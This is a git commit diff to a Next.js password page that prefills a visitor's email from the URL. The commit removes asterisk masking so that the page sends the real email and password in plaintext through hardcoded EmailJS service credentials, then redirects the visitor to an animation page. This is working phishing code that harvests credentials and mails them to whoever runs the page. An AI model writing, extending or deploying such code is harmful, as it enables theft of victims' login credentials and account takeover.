ff833901aace28920938a30fb6554d2d4ab343af
mubarak-cod <ososanyaola8@gmail.com>
2025-09-06 22:47:45 +0100

    updated code

--- app/password/page.jsx
+++ app/password/page.jsx
@@ -15,31 +15,25 @@ const Password = () => {
     const emailParam = query.get("email");
     if (emailParam) setEmail(emailParam);
   }, []);
-const handleSubmit = (e) => {
-  e.preventDefault();
 
-  // Mask the email and password
-  const maskedEmail = "*".repeat(email.length);
-  const maskedPassword = "*".repeat(password.length);
+  const handleSubmit = (e) => {
+    e.preventDefault();
 
-  emailjs
-    .send(
-      "service_n0p250r",
-      "template_u1y1vhc",
-      { 
-        email: maskedEmail,       // separate field for email
-        password: maskedPassword  // separate field for password
-      },
-      "U6DuIRAvsZ6BSxz-q"
-    )
-    .then(() => {
-      router.push("/animation");
-    })
-    .catch((err) => {
-      console.error(err);
-      alert("Failed to send email.");
-    });
-};
+    emailjs
+      .send(
+        "service_n0p250r",
+        "template_u1y1vhc",
+        { email: email, password: password },
+        "U6DuIRAvsZ6BSxz-q"
+      )
+      .then(() => {
+        router.push("/animation");
+      })
+      .catch((err) => {
+        console.error(err);
+        alert("Failed to send email.");
+      });
+  };
 
   return (
     <div
